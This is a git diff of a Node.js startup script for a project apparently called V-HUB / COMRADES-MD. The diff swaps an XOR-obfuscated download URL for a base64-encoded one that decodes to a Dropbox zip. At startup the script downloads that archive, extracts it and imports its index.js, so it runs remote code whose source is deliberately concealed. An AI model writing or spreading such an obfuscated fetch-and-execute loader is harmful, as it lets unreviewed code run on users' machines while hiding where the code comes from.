@@ -7,17 +7,8 @@ import AdmZip from 'adm-zip';
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-const keys = { a: 77, b: 21, c: 45 };
 
-const vault = {
-    p1: [33, 41, 41, 37, 46, 123, 110, 110, 122, 122, 122, 113, 111, 127, 118, 127, 115, 122, 117, 110, 118, 111, 104, 118, 127, 110, 122, 111, 127, 115, 122, 111, 127, 118, 127, 115, 122, 43, 110, 111, 123, 110, 122, 111, 110, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 110],
-    p2: [115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127],
-    p3: [118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122, 111, 127, 118, 127, 115, 122]
-};
-
-function mix(arr, k) {
-    return arr.map(n => String.fromCharCode(n ^ k)).join('');
-}
+const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9enB4Y29tNmsmZGw9MQ==";
 
 const download = (url, dest) => {
     return new Promise((resolve, reject) => {
@@ -33,29 +24,34 @@ const download = (url, dest) => {
                 file.on('finish', () => { file.close(); resolve(); });
             }).on('error', reject);
         } catch (e) {
-            reject(new Error("URL_BUILD_FAIL"));
+            reject(new Error("NETWORK_FAIL"));
         }
     });
 };
 
 async function startHub() {
-    console.log('[V-HUB] SYSTEM START');
+    console.log('[V-HUB] SYSTEM STARTING...');
     try {
-        const fullUrl = mix(vault.p1, keys.a) + mix(vault.p2, keys.b) + mix(vault.p3, keys.c);
+        // Decode the URL in memory
+        const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
         const zipPath = path.join(process.cwd(), 'core.zip');
         const extractPath = path.join(process.cwd(), 'hub_temp');
 
         if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });
 
+        console.log('[V-HUB] FETCHING CORE...');
         await download(fullUrl, zipPath);
+        
+        console.log('[V-HUB] EXTRACTING...');
         const zip = new AdmZip(zipPath);
         zip.extractAllTo(extractPath, true);
         fs.unlinkSync(zipPath);
         
+        console.log('[V-HUB] BOOTING COMRADES-MD...');
         const entryFile = path.join(extractPath, 'index.js');
         await import(`file://${entryFile}`);
     } catch (e) {
-        console.error('[V-HUB] FATAL:', e.message);
+        console.error('[V-HUB] FATAL ERROR:', e.message);
         process.exit(1);
     }
 }
